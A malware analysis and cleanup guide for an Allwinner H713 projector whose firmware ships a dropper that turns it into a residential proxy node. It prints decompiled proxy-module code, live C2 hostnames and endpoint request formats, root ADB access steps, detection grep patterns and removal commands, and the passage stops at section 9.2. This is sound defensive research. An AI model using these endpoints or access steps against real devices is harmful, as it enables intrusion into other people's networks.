# Wielo / Atongmu Malware Projector: BadBox Analysis and Cleanup (AT-M269 / H713)

Sep 26, 2026 · @R

A cheap Android projector (Wielo / Atongmu AT-M269, Allwinner H713) ships with a system-level dropper that turns it into a residential proxy node. This doc shows how to get in without opening the case, prove the infection, back up the firmware, remove the malware and verify the result.

## 1. Device

No-name LCD projector sold under changing brands. The board and firmware are shared across many H713 projectors (HY300 clones and others), so everything here applies more widely.

| Property          | Value                                                                                                                                                                                    |
| ----------------- | ---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
| Sold as           | Wielo Smart Projector, model AT-M269 (FCC ID 2BAAR-AT-M269D)                                                                                                                             |
| Manufacturer      | Shenzhen Atongmu Technology; firmware and apps from OEM "ASHD"                                                                                                                           |
| Hardware revision | `persist.sys.cm.hardversion = AT-M269_720P_HP_202410221430`                                                                                                                              |
| SoC               | Allwinner H713M (`ro.boot.hardware = sun50iw12p1`), quad Cortex-A53; board `exdroid`, platform `ares`                                                                                    |
| RAM / storage     | 1 GB DDR @ 576 MHz / 8 GB eMMC (7,818,182,656 bytes)                                                                                                                                     |
| Wi-Fi / Bluetooth | AIC8800 (`aic8800d80`, driver rwnx 6.4.3.0)                                                                                                                                              |
| Kernel            | Linux 5.4.99, 32-bit (`armv7l`), built 8 Dec 2025                                                                                                                                        |
| Real build        | `h713m_tuna_p3-user 11 RP1A.201005.006 eng.work3.20251208.154308 release-keys`, firmware `H713M-android11-v1.0`, build host `ishang-PC`                                                  |
| OS                | Android 11 (SDK 30), `user` build, security patch 2022-02-05                                                                                                                             |
| Disguise          | Reports itself as Google `ADT-3` (brand/model/device, manufacturer `askey`); real model in `ro.product.model2 = AT-M269`                                                                 |
| Partitions / boot | Virtual A/B, active slot `_b`, dynamic partitions (retrofit) in `super`; AVB 2.0, `vbmeta.device_state = locked`, `verifiedbootstate` empty; OEM unlock not allowed; `/system` 100% full |
| Security          | `ro.debuggable=1`, `ro.adb.secure=0`, `service.adb.root=1`, ADB on tcp/5868, SELinux permissive, privapp permissions `permissive`, AOSP test keys                                        |
| Region defaults   | Timezone `Asia/Shanghai`, DTV area `cn` / DTMB                                                                                                                                           |

```
# Read the identity yourself
adb shell getprop ro.product.model     # ADT-3   <- spoofed, to pass Google certification
adb shell getprop ro.product.model2    # AT-M269 <- real model
adb shell getprop ro.board.platform    # ares, H713 platform name
adb shell getprop ro.build.type        # user    <- release build
```

## 2. Get in

ADB is listening on the network, on a non-standard port, with no authorisation prompt and root rights.

```
# 1. Find open ports (projector on an isolated network)
nmap -p- 10.56.215.10
#   5868/tcp open   <- nmap guesses "diameters"; it is actually adbd

# 2. Confirm from the device side (e.g. via Termux on the projector)
getprop service.adb.tcp.port   # 5868
getprop ro.adb.secure          # 0    -> no "allow debugging?" prompt
getprop init.svc.adbd          # running

# 3. Connect from a computer
adb connect 10.56.215.10:5868
adb root
adb shell id                   # uid=0(root)
```

### Turn lamp off while working over ADB

```
adb shell 'echo adb_keepalive > /sys/power/wake_lock'    # keep CPU/Wi-Fi awake (needs root adbd)
adb shell cat /sys/power/wake_lock                       # adb_keepalive must be listed
adb shell input keyevent KEYCODE_SLEEP                   # display + lamp off, ADB stays connected

# when done
adb shell input keyevent KEYCODE_WAKEUP                  # lamp on
adb shell 'echo adb_keepalive > /sys/power/wake_unlock'  # release the wakelock
```

`/sys/class/backlight/tv` > `brightness`/`bl_power` have no effect.

## 3. Infection chain

Two preinstalled system apps run as the system user (UID 1000). One downloads a loader, loader downloads four proxy modules and a second, independent loader.

```
Firmware (preinstalled, UID 1000)
├─ com.android.sysapp          /system/priv-app/AshdSysApp
│    OTA updater, can replace the whole firmware (update.zip / payload.bin)
│    C2: wjtysj.ishanghd.com/hx_kt.php
│
└─ com.android.umanalytics.yiyou /system/app/AndroidAnalytics_yiyou
     Dropper; Umeng + Baidu tracking
     └─ downloads cache/plugin.jar       (DEX, from *.ishanghd.com)
          ├─ app installer: pulls app lists per device profile, pm install -r
          │    └─ installs Disney+ etc. and com.google.adtest (payload)
          └─ "hs" task loader, C2 api.loritor.cc / api.nizero.cc, every 6 h
               └─ 4 encrypted modules  code_cache/.hs/.file/.rf/*.rf
                    SKN0041 com.ad.proxy   SKN0054 com.szns.sdk
                    SKN0058 com.link.core  SKN0061 ddth2 (VpsSdk)
                    -> all four: residential proxy clients

com.google.adtest (/data/app, installed by yiyou)
     Second loader "com.speed", own C2 (api.logobi.cc, api.pechlo.cc, ...)
     Native plugin loader, may install/delete packages -> backup channel
```

\> strangers' internet traffic routed through your connection, and your device is tracked (serial, MACs, Wi-Fi SSID/BSSID).

## 4. Proof of factory level infection

### **a) Proxy-like traffic: one process, many foreign connections**

```bash
adb shell "netstat -tnp | grep ESTABLISHED"
# tcp6 ... ::ffff:43.116.39.73:188    ESTABLISHED 4795/com.android.umanalytics.yiyou
# tcp6 ... ::ffff:198.44.189.x:9200   ESTABLISHED 4795/com.android.umanalytics.yiyou
# ... ~25 lines, same process, many IPs, odd ports
#  -> an "analytics" app does not hold 25 parallel sessions: this is a proxy node
```

### **b) Who installed what**

```bash
adb shell pm list packages -i | grep -v 'installer=null\|com.android.vending'
# package:com.google.adtest       installer=com.android.umanalytics.yiyou  <- payload
# package:com.disney.disneyplus   installer=com.android.umanalytics.yiyou  <- cover
#  -> a system "analytics" app installing packages = dropper

adb shell dumpsys package com.google.adtest | grep -E 'codePath|firstInstallTime'
#  fake Google name, lives in /data/app, installed silently
```

### **c) Payload files in the dropper's data folder**

```bash
adb shell 'ls -laR /data/data/com.android.umanalytics.yiyou' | grep -E 'plugin.jar|\.rf|files/apps'
# cache/plugin.jar    <- downloaded loader (DEX)
# code_cache/.hs/.file/.rf/-1.dex_assdk_huang_*SKN00xx*.rf    <- 4 encrypted modules
# files/apps/com.google.adtest.apk   <- stored payload for reinstall
# directories are chmod 777
```

### **d) System-level setup**

```bash
adb shell getprop ro.product.model
# ADT-3 (spoofed)
adb shell dumpsys package com.android.sysapp | grep sharedUser
# android.uid.system  -> runs with system privileges
adb shell dumpsys package com.android.sysapp | grep -E 'INSTALL_PACKAGES|RECOVERY|MASTER_CLEAR'
# unnamed OEM app that may install apps, flash firmware and wipe the device
adb shell cat /system/etc/init/qw.rc
# service qw /system/bin/qw --daemon  user root
```

### **e) Malware ran on factory build day**

The malware is built right into the firmware. Build date is `eng.work3.20251208.154308`, kernel was compiled `Mon Dec 8 15:27:38 CST 2025`. yiyou's records show it was running the same day:

```
# baidu_mtj_sdk_record.xml (yiyou data)
session_recent_visit: [{"day":20251208,"count":1}, {"day":20260910,...}, ...]
#   first recorded run = 8 Dec 2025, the day the firmware was built

# ua.db (yiyou's Umeng session table), timestamps column __f
1765179258896  ->  2025-12-08 07:34 UTC  =  15:34 CST, ~7 min after the kernel build
```

### **f) Malware in the vendor-signed, read-only system image**

A user or a later app can't put files into `/system`. It's part of `super`, protected by dm-verity and signed through `vbmeta`.

## 5. Malware architecture overview

### 5.1. Main components

| Component                         | Location                     | What it does                                                                                                    |
| --------------------------------- | ---------------------------- | --------------------------------------------------------------------------------------------------------------- |
| `com.android.umanalytics.yiyou`   | `/system/app`, UID 1000      | Downloads and runs `plugin.jar`; sends serial, MACs, android_id, Wi-Fi SSID/BSSID, Bluetooth MAC to Umeng/Baidu |
| `plugin.jar` (DEX)                | yiyou `cache/`               | Two parts: app installer (per-device app lists, 40+ profiles for H713/RK3326/HY300) and the "hs" task loader    |
| "hs" task loader                  | inside `plugin.jar`          | Polls C2 every 6 h for tasks of type `jar`, `dex` or `apk`; downloads, checks MD5, executes                     |
| SKN0041 `com.ad.proxy`            | `.rf` module                 | TCP/UDP/ICMP tunnelling, heartbeat, sign-in/report                                                              |
| SKN0054 `com.szns.sdk`            | `.rf` module                 | Proxy node plus UDP scanning from your network                                                                  |
| SKN0058 `com.link.core`           | `.rf` module                 | Proxy client with its own DNS resolvers                                                                         |
| SKN0061 `ddth2` / VpsSdk          | `.rf` module                 | Proxy gateway, many parallel client instances                                                                   |
| `com.google.adtest` ("com.speed") | `/data/app`                  | Second loader with native plugin loader; install/delete packages; restarts on boot, network, HDMI, power events |
| `com.android.sysapp`              | `/system/priv-app`, UID 1000 | OTA updater: can download and flash a full firmware image                                                       |
| Widevine files                    | `/data/mediadrm/IDM1013/L3/` | `plugin.jar` drops a DRM key/licence bundle so streaming apps run on the uncertified device                     |

### 5.2. How pieces stay hidden

```
# C2 hostnames are not in plain text: gzip + Base64 + AES-CFB with a hardcoded key.
#   decrypted: api.loritor.cc (master), api.nizero.cc (slave)
# DNS is resolved via DNS-over-HTTPS (dns.google, cloudflare-dns.com, doh.pub, 223.5.5.5)
#   -> router DNS blocking alone misses it
# .rf module layout (per file):
#   [version][...][salt:32 bytes][invocation: AES][module: AES][DSA signature]
#   invocation = {"cn":"com.hotota.p.d.MainApi","m_init":"start_W00xx","m_uninit":"stop"}
#   module     = an APK whose classes.dex is loaded with DexClassLoader
# Modules are signed, so only the operator can push new ones.
```

### 5.3. What tracking sends

```
shared_prefs/info.xml        wifiinfo: ssid, bssid, device MAC, IP; blueinfo: BT MAC; accelerometer samples
shared_prefs/umeng_*.xml     appkey 61c17582e014255fcbc1a9af, channel ashd-analytics
umeng_general_config.xml     first_activate_time = 2 Mar 2026, successful_request = 218
hs.prefs_1.xml               periods=21600 (6 h), last.trackerid = SKN0061
```

### 5.4. Lateral movement

**No automatic lateral movement, but a door into the LAN**

> But **SKN0041** and **SKN0058** relay to any target the gateway names, and SKN0041 can also ping it on command. Anyone renting the proxy can reach or probe into the LAN by hand.

- `plugin.jar`
- decrypted `.rf` modules SKN0041/54/58/61
- `com.google.adtest`, yiyou, sysapp
- `com.android.nfx` (NFXAccessibility)
- native: `qw`, `systemmixservice`, `libsystemmix_jni.so`, `libsystemmixservice.so`

```bash
grep -rlE 'ServerSocket|DatagramSocket|MulticastSocket|NetworkInterface|getDhcpInfo|/proc/net/arp|239\.255\.255\.250|224\.0\.0\.251|:5555|telnet|isReachable|NsdManager|JmDNS|UPnP|Cling|SSDP|WifiP2pManager|getBroadcast|broadcastAddress|SubnetMask|prefixLength|getLinkAddresses|InterfaceAddress' analysis/decompiled/*/sources
grep -rlE 'Runtime\.getRuntime\(\)\.exec|ProcessBuilder' analysis/decompiled/*/sources
```

| Term                                                                  | What it does                                                                                                                                                                     | LAN               |
| --------------------------------------------------------------------- | -------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- | ----------------- |
| `NetworkInterface` (adtest, plugin, SKN0061)                          | Reads the device's own IP and MAC for the bot ID                                                                                                                                 | No                |
| `DatagramSocket` in SKN0041                                           | UDP relay for proxy sessions to the gateway                                                                                                                                      | No                |
| `DatagramSocket` in SKN0054                                           | C2 discovery: sweeps `43.153.12-80.1-100:8080` (public cloud range)                                                                                                              | No                |
| `ServerSocket` in `plugin.jar`                                        | Video re-stream server, see below                                                                                                                                                | No                |
| `Runtime.exec` hits (yiyou, plugin.jar, adtest, SKN0041/54/58/61)     | 3rd-party SDK internals, `chmod 777` on local files, `su`/`pm`/`dumpsys` for foreground-app or root checks and operator-issued `ping` in SKN0041                                 | Only ping command |
| UPnP, mDNS/NSD, SSDP, WiFi Direct, ARP/subnet math, ADB 5555, telnet  | none                                                                                                                                                                             | No                |
| `systemmixservice` / `libsystemmixservice.so` / `libsystemmix_jni.so` | Binder-only OEM service: property get/set, raw file read/write/delete, mount/umount, boot logo/animation. No `socket`/`bind`/`connect`/`listen`/`accept` symbol in either binary | No                |
| `qw`                                                                  | Superuser/ClockworkMod su daemon. Only Unix domain socket paths in its strings (`/dev/com.koushikdutta.superuser[.daemon]`), no IP literal, no `AF_INET`                         | No                |
| `com.android.nfx` (NFXAccessibility)                                  | Netflix D-pad navigation helper, active only while `com.netflix.mediaclient` is in the foreground. Manifest has no `INTERNET` permission at all                                  | No                |

```java
// SKN0054  com/szns/sdk/t.java  - refuses private and loopback targets, IPv4 dotted-decimal only
str.equals("0.0.0.0") || str.matches("^10\\..*") || str.matches("^172\\.(1[6-9]|2\\d|3[0-1])\\..*")
    || str.matches("^192\\.168\\..*") || str.matches("^127\\..*")
// no 169.254.0.0/16 clause and no IPv6 form here, a link-local or IPv6 LAN target slips through

// SKN0061  ddth2/hidden/F.java  - InetAddress's own range checks, covers link-local and IPv6 too
!a.isAnyLocalAddress() && !a.isLoopbackAddress() && !a.isLinkLocalAddress()
    && !a.isSiteLocalAddress() && !a.isMulticastAddress()

// SKN0041  com/ad/proxy/b/Q.java  - "url init" command: fetches any URL, no check
InetAddress byName = InetAddress.getByName(host);
createSocket.connect(new InetSocketAddress(byName, port), 10000);

// SKN0058  com/link/core/a/e.java  - connects to the server-supplied address, no check
this.c.connect(new InetSocketAddress(inetAddress, this.d));
```

SKN0041's full command set, from the `com/ad/proxy/b/a0.java` dispatch table:

| Opcode | Handler    | Does                                                                               |
| ------ | ---------- | ---------------------------------------------------------------------------------- |
| 1 / 2  | U / V      | heartbeat request / response                                                       |
| 3      | W          | opens a raw TCP connection to an operator-supplied host:port, no address check     |
| 5 / 7  | X / Y      | tcp send / close on an open transaction                                            |
| 8      | Z          | opens a raw UDP session to an operator-supplied host:port, no address check        |
| 11     | K          | udp close                                                                          |
| 12     | L          | runs `ping -c 10 <host>` on an operator-supplied host, relays the full output back |
| 14     | M          | fetches an operator-supplied URL, no check                                         |

None of these opcodes filter by IP range.

The `plugin.jar` video re-stream server (`com.cloudmedia.tv.server.d`, NanoHTTPD fork) binds with no host set, meaning all interfaes, LAN-reachable, not just localhost, if it starts. But its only entry point is `ParserUtils.AnalyticsHelper()`, behind `getprop ro.board.platform == "rk3188"`. This unit is `ares` H713, so here it doesn't run.

`systemmixservice`'s Binder interface (arbitrary file read/write/delete and property-set as root, reachable by any app on the device) is a local privilege-escalation. Removing the dropper and not installing untrusted APKs makes it dormant but not disappear.

## 6. Indicators

Network indicators (domains, URLs, IPs) are in [section 11](#11-consolidated-hosturl-list-for-abuse-reports).

### 6.1. Packages

| Package                                                         | Location                                                | Role                                                             |
| --------------------------------------------------------------- | ------------------------------------------------------- | ---------------------------------------------------------------- |
| `com.android.umanalytics.yiyou`                                 | `/system/app/AndroidAnalytics_yiyou`, UID 1000 (system) | dropper                                                          |
| `com.android.sysapp` (AshdSysApp)                               | `/system/priv-app/AshdSysApp`, UID 1000 (system)        | OTA-channel backdoor                                             |
| `com.google.adtest` (real name `com.fotas.wanapp`, "com.speed") | `/data/app`                                             | second loader                                                    |
| `com.cloudmedia.testapk`                                        | `/system/app`                                           | OEM factory test app, removed alongside the dropper in section 8 |
| `com.disney.disneyplus`                                         | `/data/app`                                             | cover app installed by the dropper                               |
| `com.android.nfx`                                               | `/system/priv-app/NFXAccessibility`                     | kept, harmless (Netflix remote-control helper)                   |

### 6.2.Binaries

| Binary                                                                             | Init service                                                                          | What it does                                                                                                                                                                                                                                                                                  |
| ---------------------------------------------------------------------------------- | ------------------------------------------------------------------------------------- | --------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
| `/system/bin/qw`                                                                   | **`qw`**: `class core`, `user root`, runs permanently from boot                       | Superuser/ClockworkMod su daemon (opens `/dev/com.koushikdutta.superuser` + `.daemon` sockets).                                                                                                                                                                                               |
| `/system/bin/appsdisable`                                                          | **`appsdisable`**: triggered `on property:sys.boot_completed=1`, `disabled`+`oneshot` | After a 4 s sleep on boot (`settings ... global start_disable`), finds every installed package with a `BOOT_COMPLETED` receiver that starts with `com.google.android` and `pm disable`s it. Kills Google's own boot-time checks like Play Protect scanning and GMS core services. |
| `/system/bin/gmsopt`                                                               | **`gmsopt`**: same trigger and flags as appsdisable                                   | Same anti Google behavior as appsdisable but excluding `com.google.android.permissioncontroller`. Redundant.                                                                                                                                                                |
| `/system/bin/systemmixservice` (+ `libsystemmix_jni.so`, `libsystemmixservice.so`) | **`systemmix`**: `class main`, `user root`, `oneshot`                                 | OEM native? Purpose not fully determined but is root group.                                                                                                                                                                                                                                   |

### 6.3. Files & directories

| Path                                                                                                                                                                          | What                                                     |
| ----------------------------------------------------------------------------------------------------------------------------------------------------------------------------- | -------------------------------------------------------- |
| `/data/data/com.android.umanalytics.yiyou/cache/plugin.jar`                                                                                                                   | downloaded "hs" loader / app-installer DEX               |
| `/data/data/com.android.umanalytics.yiyou/code_cache/.hs/.file/.rf/*.rf`                                                                                                      | encrypted proxy modules (SKN0041/54/58/61)               |
| `/data/data/com.android.umanalytics.yiyou/files/apps/com.google.adtest.apk`                                                                                                   | stored payload copy for silent reinstall                 |
| `/data/data/com.android.umanalytics.yiyou/files/libcuid.so`                                                                                                                   | device-ID helper native library                          |
| `/data/data/com.android.umanalytics.yiyou/databases/ua.db`                                                                                                                    | Umeng session DB                                         |
| `/data/data/com.android.umanalytics.yiyou/shared_prefs/{info.xml, umeng_*.xml, hs.prefs_1.xml, hs.cuid.v1.xml, vps_sdk_prefs.xml, Plugin.xml, baidu_mtj_sdk_record.xml, ...}` | tracking/config prefs                                    |
| `/data/data/com.android.sysapp/shared_prefs/SHARE.xml`                                                                                                                        | OTA download-state prefs                                 |
| `/data/mediadrm/IDM1013/L3/`                                                                                                                                                  | dropped Widevine L3 DRM bundle                           |
| `/data/local/tmp/*`, `/data/ota_package/tmp/*`                                                                                                                                | scratch/leftover space used by the loader and OTA client |

### 6.4. Sample hashes

| Sample                          | SHA-256                                                            |
| ------------------------------- | ------------------------------------------------------------------ |
| `plugin.jar`                    | `e2e5f86df18e0cdef9595bd886280f158001250f1565fa3e6dfe492b114be6f7` |
| SKN0041 (decrypted)             | `d7b26e53ade1cfcd283bfbbc5de7f792e8f8d441d74162eeef7e8a7c83ed5dba` |
| SKN0054 (decrypted)             | `ba3b320791b80dae25d07e17e43d4b11b5c5a0d8b989fdb4a7f47ccb39201307` |
| SKN0058 (decrypted)             | `60ade80fcd0a1c5bb3f62e76cd056b0e8034fdbe1e9834c335c0e60d99d12742` |
| SKN0061 (decrypted)             | `fcffed775c6d6967bd40e4fa5b529f9fd301b3ebd64a555c756943d1e863fea7` |
| `com.google.adtest.apk`         | `1298662eb6d087aa1e6f967d50581e998b5897ec1563bdf96589540845874110` |
| `AndroidAnalytics_yiyou.apk`    | `c4910d6fa666eff03bdc683423f7f2585cb263f8dcbf5f1fe7a1e2643eb384aa` |
| `AshdSysApp.apk`                | `f9cd44d359c9b0c92ddb8b868665a3e8edd54a19cc21a35fb2fba7dbdf36bb5a` |
| `L3.zip` (Widevine bundle)      | `8367725743c27ed1fd49d5eb086e7b260cfcf38a825a8892ce31b45e767e228f` |
| `favorite.ico` (SKN0054 config) | `8d64d2982f8f5cb01ad1bbce53861e09eae2884fe8c545ac9023b636c8f5ffa2` |

## 7. Backup

No firmware for this model seems to be published, and the reverse engineered vendor OTA server returns nothing as well.

```
# Simple one-shot dump (fine over USB; over Wi-Fi it can stall)
adb exec-out "dd if=/dev/block/mmcblk0 bs=4M 2>/dev/null" > mmcblk0.img
adb shell 'ls /dev/block/mmcblk0boot*'      # eMMC boot areas, dump them too if present
```

**Over Wi-Fi, use the helper scripts**

1. `dump-pull.sh [ip:port|usb] [file]` pulls in 256 MB chunks with a size check and retries. Re-running continues at the last complete chunk. Before reading, it remounts /data with background_gc=off,nodiscard, syncs and waits. Over USB it runs adb shell stop. Both to reduce writes during backup, both undone on exit (remount background_gc=on,discard, start). UDISK is /data and stays live, so its hash can still differ from run to run.
3. `dump-verify.sh [ip:port|usb] [file] [-y]` checks size, GPT headers, the boot areas and every partition (device SHA-256 vs. the same byte range in the image). It reads and patches mismatching sections. On a clean pass it writes `mmcblk0.img.sha256`.

```
# What the partition check does, per partition
p=$(adb shell readlink /dev/block/by-name/super | xargs basename)   # e.g. mmcblk0p9
s=$(adb shell cat /sys/block/mmcblk0/$p/start)                     # start sector (512 B)
z=$(adb shell cat /sys/block/mmcblk0/$p/size)                      # size in sectors
adb shell sha256sum /dev/block/by-name/super                       # hash on the device
tail -c +$((s*512+1)) mmcblk0.img | head -c $((z*512)) | shasum -a 256   # same range in the image
# userdata, metadata, misc change while Android runs: a mismatch there is expected
```

### Restore path

Get into Allwinner FEL, then flash with PhoenixUSBPro over a USB-A to USB-A cable.

There is no external pinhole to boot into FEL: `adb reboot efex` or `fastboot oem efex`.

Possible hardware fallback: the FEL pad on the board, visible on the FCC internal photos (needs the case opened). Flashing needs an IMAGEWTY `update.img`, built from your dump with `awimg.py` ([well0nez/magcubic-root](https://github.com/well0nez/magcubic-root)) and an H713 template.

### **Boot modes**

The unit is A/B (`ro.build.ab_update=true`) with slot `_b` active. Recovery lives in the boot ramdisk. The U-Boot serial console is `ttyS0` at 115200 baud.

| Mode            | How to enter                                                                                                 | Level                 | Status                                                                                      |
| --------------- | ------------------------------------------------------------------------------------------------------------ | --------------------- | ------------------------------------------------------------------------------------------- |
| Android         | normal power-on, `adb reboot`                                                                                | kernel                | works                                                                                       |
| Recovery        | `adb reboot recovery`                                                                                        | boot ramdisk          | works, menu below                                                                           |
| fastbootd       | recovery menu: Enter fastboot                                                                                | userspace in recovery | enters                                                                                      |
| U-Boot fastboot | recovery menu: Reboot to bootloader, or `adb reboot bootloader`                                              | U-Boot                | works (macOS needs the fix below)                                                           |
| U-Boot efex     | `fastboot oem efex` from U-Boot fastboot, or `adb reboot efex` (U-Boot also has an `ir-efex` remote trigger) | U-Boot                | works via `fastboot oem efex` and via `adb reboot efex`: `1f3a:efe8`, FEL handshake answers |
| BootROM FEL     | FEL test pad                                                                                                 | SoC BootROM           | untested                                                                                    |

### **Recovery menu:**

- Reboot system now
- Reboot to bootloader
- Enter fastboot
- Apply update from ADB
- Apply update from SD card
- Wipe data/factory reset
- Mount /system
- View recovery logs
- Run graphics test
- Run locale test
- Enter rescue
- Power off

### **ADB over USB**

In case you have trouble with your USB connection: the socket that takes USB0 (`ohci0`) runs as host by default. It switches to device mode until the next reboot with:

```
adb shell cat /sys/devices/platform/soc@2900000/soc@2900000:usbc0@0/usb_device
adb -d shell id
```

**U-Boot fastboot not detected**

Shows up as `1f3a:1010` ("USB Developer"), and its interface is the standard fastboot `ff/42/03`. Its device class is `ff`, though, the os (macOS here) seems to not setup a configuration and `fastboot devices` stays empty.

If this happens the fix is to set the configuration once with pyusb, then use fastboot as normal:

```
# one-time setup
brew install libusb
python3 -m venv ~/venvs/fastboot
source ~/venvs/fastboot/bin/activate
pip install pyusb

# each time the projector is in U-Boot fastboot
source ~/venvs/fastboot/bin/activate
python3 -c 'import usb.core; usb.core.find(idVendor=0x1f3a,idProduct=0x1010).set_configuration()'
fastboot devices
```

### **FEL/efex**

From U-Boot fastboot, `fastboot oem efex` switches to the efex gadget `1f3a:efe8`. (Might need the same `set_configuration()` fix)

**Sunxi-tools build from source**

```
# one-time: build sunxi-fel
brew install libusb dtc pkg-config
git clone https://github.com/linux-sunxi/sunxi-tools
cd sunxi-tools && make sunxi-fel
sudo cp sunxi-fel /usr/local/bin/   # optional, else call ./sunxi-fel

# enter efex and check handshake
fastboot oem efex
source ~/venvs/fastboot/bin/activate
python3 -c 'import usb.core; usb.core.find(idVendor=0x1f3a,idProduct=0xefe8).set_configuration()'
sunxi-fel --list --verbose
sunxi-fel version
```

`AWUSBFEX soc=00001860(unknown) 00000001 ver=0001 44 08 scratchpad=00121500 00000000 00000000`. \
Use only `version` and `--list`, never `spl`, `uboot`, `write` or `exe` since sunxi tools doesnt know the chipset.

To leave FEL, unplug USB first, then power off until the blue led on the projector switches off. `wdreset` does not work without SoC data.

## 8. Cleaning

### 8.1. Backup evidence

```
mkdir -p evidence && cd evidence
adb shell getprop > getprop.txt
adb shell pm list packages -f -i -U > packages.txt
adb shell "netstat -tnp" > netstat.txt
adb shell 'ls /system/etc/init /vendor/etc/init' > init-files.txt

# APKs of the suspicious apps
adb pull /system/app/AndroidAnalytics_yiyou
adb pull /system/priv-app/AshdSysApp
adb pull "$(adb shell pm path com.google.adtest | cut -d: -f2)" adtest.apk

# Complete app data incl. hidden folders (plugin.jar, .rf modules, prefs)
adb exec-out 'tar -cf - /data/data/com.android.umanalytics.yiyou /data/data/com.android.sysapp' > appdata.tar
tar -tvf appdata.tar | grep -E '\.jar|\.rf|\.apk|\.xml'     # check nothing is missing
find . -type f -exec shasum -a 256 {} + > ../SHA256SUMS

```

### 8.2. Removal

```
# System apps (UID 1000): cant be deleted from /system without firmware rebuild.
# Stop, disable, wipe data for user 0 -> inert for the running system, survives reboots.
for p in com.android.umanalytics.yiyou com.android.sysapp com.cloudmedia.testapk; do
  adb shell am force-stop $p
  adb shell pm disable-user --user 0 $p
  adb shell pm clear $p
done

adb shell pm uninstall com.google.adtest

# I removed this too for safety
adb shell pm uninstall com.disney.disneyplus

# Leftovers
adb shell 'rm -rf /data/local/tmp/* /data/ota_package/tmp/*'

adb reboot
```

**Kept, probably harmless:**

- `qw` (su daemon, only removable by editing `/system`, reachable locally only)
- harmless OEM apps: `appsdisable`, `gmsopt`, `systemmixservice`
- `com.android.nfx` (Netflix remote-control helper)

**Anti tamper check**

Uninstalling yiyou breaks Settings. `com.ashd.settings`'s `checkSHA1()` has two checks:

1. Settings' own signing cert, requiring a match against one of five hardcoded SHA1s (`CD:B1:B7:56:85:FE:16:C2:7E:4C:45:59:54:43:AC:B0:1F:68:40:91`, `60:35:FD:9E:68:E9:20:C2:B5:B0:7C:F2:B5:10:F2:83:47:06:DE:15`, `6E:40:BA:7F:F7:90:7D:40:C2:F1:6D:12:E4:63:E5:E4:A3:F1:5A:01`, `27:19:6E:38:6B:87:5E:76:AD:F7:00:E7:EA:84:E4:C6:EE:E3:3D:FA`, `F6:08:8C:ED:B9:9A:EC:82:A7:7D:F3:F9:01:97:06:BE:C0:65:E4:9A`)
2. Check whether `com.android.umanalytics.yiyou`, (or `com.android.umanalytics.kege`, likely the dropper's name on a other firmware builds), is registered for user 0.

Both log `签名校验失败，关闭应用` ("signature check failed, closing app"). Fully uninstalling yiyou (rather than just disabling it, as above) trips this. `adb shell pm install-existing com.android.umanalytics.yiyou` restores the registration without re-enabling it.

### 8.3. Confirmation

```
adb connect 10.56.215.10:5868

adb shell pm list packages | grep -iE 'yiyou|sysapp|adtest|speed|testapk'   # expect: nothing
adb shell ps -A | grep -iE 'yiyou|sysapp|speed|umanalytics'               # expect: nothing
adb shell 'ls /data/data/com.android.umanalytics.yiyou 2>&1'              # expect: No such file
adb shell "netstat -tnp | grep ESTABLISHED"
#   expect: only adbd to your computer (plus Google services, if allowed)
#   red flag: any process with several connections to public IPs

adb shell pm list packages -3 -i     # new apps? check their installer
```

**Results on this unit after cleaning and reboot:**

```
adb shell "netstat -tnp"
# tcp   127.0.0.1:52992  127.0.0.1:5354  ESTABLISHED 3351/com.android.toofifi  <- local screen-cast service
# tcp   127.0.0.1:52994  127.0.0.1:5354  ESTABLISHED 3351/com.android.toofifi
# tcp6  10.56.215.10:5868  <your computer>  ESTABLISHED 5332/adbd              <- your ADB session
#  -> no outbound connections left (before: ~25 from yiyou)
```

Repeat the `netstat` check after 24 hours (the loader checks in every 6 hours) and look for blocklist hits from the projector's IP in your DNS and firewall logs.

### 8.4. Limits

- A factory reset brings yiyou & sysapp back. Re-run section 8 before network access.
- Remounting `/system` read-write to delete the APKs isn't recommended: `vbmeta` is locked, `/system` is 100% full, so `adb disable-verity` + `adb remount` would create an overlay in `/data` (lost on factory reset, like `pm uninstall --user 0`) at the risk of a boot failure.
- So permanent removal means deleting the APKs from `super` in your dump and flashing it via FEL. Untested.

```
adb shell getprop ro.boot.vbmeta.device_state   # locked
adb shell getprop ro.boot.verifiedbootstate     # (empty)
adb shell df -h /system                         # 1.1G 1.1G 3.4M 100%
```

### 8.5. Bloatware

```
adb shell pm disable-user --user 0 com.android.toofifi
adb shell pm disable-user --user 0 com.toofifi.lineserver
adb shell pm disable-user --user 0 com.toofifi.miracast
adb shell pm disable-user --user 0 com.mphotool.usbcastserver
adb shell pm disable-user --user 0 com.rockchip.devicetest
```

Reverse with `pm enable --user 0 <package>`

- `com.android.toofifi`: core screencast service. Loses screen mirroring (Miracast/AirPlay-style casting) from phones and laptops.
- `com.toofifi.lineserver`: wired/USB display server for the same stack, phones home to `server.mphotool.com:8680` for license checks. Loses wired display mode.
- `com.toofifi.miracast`: wireless Miracast receiver, calls `server.mphotool.com:8680/MPAPI/System/CheckUpdate` and uploads usage logs to `mphotool.com/FeituAppLogMgr`. Loses wireless casting.
- `com.mphotool.usbcastserver`: USB cast server, same vendor. Loses USB cast-from-device support.
- `com.rockchip.devicetest`: No reason to be on an Allwinner unit.

## 9. Full component map

Static analysis, Claude assisted. Raw decompiled sources, the decrypted `.rf` modules, and the scripts used are in `analysis/` (`decompiled/`, `decrypted_modules/`, `tools/`).

### 9.1 OTA updater

`com.android.sysapp`

OTA request (`a.a.b.m`/`a.a.b.n`)

```
POST http://wjtysj.ishanghd.com/hx_kt.php?act=project&do=getPackageInfo
     &productid=<ro.android.productid, default "74865231">
     &device_mode=<persist.sys.cm.dtsmodel, e.g. "AT-M269">
     &devices_version=<ro.build.version.incremental>
     &update_type=1|2        # 1 auto check, 2 forced ("check for update" button)
```

via Apache `HttpPost` with empty form body. Everything is in the query string, so GET and POST are equivalent and no signature/token. Replayed live: `{"code":200,"data":[]}`, so seems to have no package for this productid, at any version tried.

### 9.2 Dropper

`com.android.umanalytics.yiyou`

**Self-update** (`http.utils.UpdateUtils.checkUpdate`)
`GET http://ty.ishanghd.com/work/app/wj/factory/update.json` delivers `DownLoadURL` with `MD5` and `VersionCode` which isdownloaded, MD5-checked, `PkgUtils.install(path, 1)` and silently self replacing.

**`plugin.jar` fetch** (`MyService`)
